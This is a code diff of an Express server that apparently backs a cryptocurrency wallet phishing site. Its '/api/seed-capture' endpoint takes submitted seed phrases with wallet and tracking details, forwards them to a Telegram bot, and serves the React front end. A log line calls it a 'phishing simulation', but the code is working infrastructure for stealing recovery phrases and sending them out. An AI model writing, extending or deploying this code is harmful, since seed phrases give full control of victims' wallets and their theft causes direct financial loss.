@@ -4,11 +4,14 @@ import express from 'express'
 import cors from 'cors'
 import axios from 'axios'
 import dotenv from 'dotenv'
+import path from 'node:path'
+import { fileURLToPath } from 'node:url'
 
-// Force Node.js to resolve DNS to IPv4 first (fixes api.telegram.org IPv6 hang)
 dns.setDefaultResultOrder('ipv4first')
-
 dotenv.config()
+
+const __filename = fileURLToPath(import.meta.url)
+const __dirname = path.dirname(__filename)
 
 const app = express()
 app.use(cors())
@@ -17,22 +20,14 @@ app.use(express.json())
 const PORT = process.env.PORT || 3001
 
 // =====================================================================
-// Receive seed phrase → send to Telegram
+// Seed capture → Telegram
 // =====================================================================
 app.post('/api/seed-capture', async (req, res) => {
   const { wallet, phrase, wordCount, trackingId, userAgent, timestamp } = req.body || {}
-
   if (!phrase) return res.status(400).json({ error: 'Missing phrase' })
 
-  console.log('\n=========================================')
-  console.log('🎣 PHISHING SIMULATION — SEED CAPTURED')
-  console.log('=========================================')
-  console.log('Wallet:     ', wallet)
-  console.log('Word count: ', wordCount)
-  console.log('Tracking ID:', trackingId)
-  console.log('Time:       ', timestamp)
-  console.log('Phrase:     ', phrase)
-  console.log('=========================================\n')
+  console.log('\n=== PHISHING SIMULATION — SEED CAPTURED ===')
+  console.log('Wallet:', wallet, '| Words:', wordCount, '| ID:', trackingId)
 
   const BOT  = process.env.TELEGRAM_BOT_TOKEN
   const CHAT = process.env.TELEGRAM_CHAT_ID
@@ -45,28 +40,30 @@ app.post('/api/seed-capture', async (req, res) => {
       `*Tracking ID:* ${trackingId}`,
       `*Time:* ${timestamp}`,
       '',
-      `*Phrase:*`,
       '`' + phrase + '`',
     ].join('\n')
-
     try {
       await axios.post(`https://api.telegram.org/bot${BOT}/sendMessage`, {
-        chat_id: CHAT,
-        text,
-        parse_mode: 'Markdown',
+        chat_id: CHAT, text, parse_mode: 'Markdown',
       })
       console.log('✅ Sent to Telegram')
     } catch (err) {
       console.error('Telegram failed:', err.message)
     }
-  } else {
-    console.warn('⚠️ Telegram not configured')
   }
-
   res.json({ success: true, trackingId })
 })
 
-// Health check
 app.get('/api/health', (req, res) => res.json({ ok: true }))
+
+// =====================================================================
+// Serve the built React frontend from /dist
+// =====================================================================
+app.use(express.static(path.join(__dirname, 'dist')))
+
+// Any non-API route → React index.html (for React Router)
+app.get(/^\/(?!api).*/, (req, res) => {
+  res.sendFile(path.join(__dirname, 'dist', 'index.html'))
+})
 
 app.listen(PORT, () => console.log(`Backend listening on http://localhost:${PORT}`))
